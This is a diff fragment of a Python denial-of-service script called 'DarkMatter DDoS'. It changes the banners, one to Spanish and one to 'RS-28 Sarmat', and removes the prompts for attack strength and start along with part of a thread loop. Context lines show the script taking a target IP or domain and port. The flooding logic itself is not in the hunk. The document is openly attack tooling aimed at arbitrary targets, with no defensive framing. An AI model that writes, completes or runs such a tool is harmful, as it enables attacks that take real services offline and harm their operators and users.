@@ -69,40 +69,12 @@ def attack():
     except:
       pass
 
-print("Welcome To DarkMatter DDoS\n")
+print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
 url = f"http://{str(ip)}"
-print("[>>>] Starting the attack [<<<]")
-
-
-def multiplication():
-	global multiple
-	try:
-		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
-	except ValueError:
-		print("You mistyped, try again.\n")
-		multiplication()
-	begin()
-
-def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
-	if choice6 == "":
-		loop()
-	elif choice6 == "Enter": #lool
-		loop()
-	elif choice6 == "enter": #loool
-		loop()
-	else:
-		sleep(1)
-
-def loop():
-	global threads
-	global acceptall
-	global connection
-	global go
-	global x
-	
+print("[>>>] RS-28 Sarmat [<<<]")
+sleep(1)
 
 	
 def send2attack():
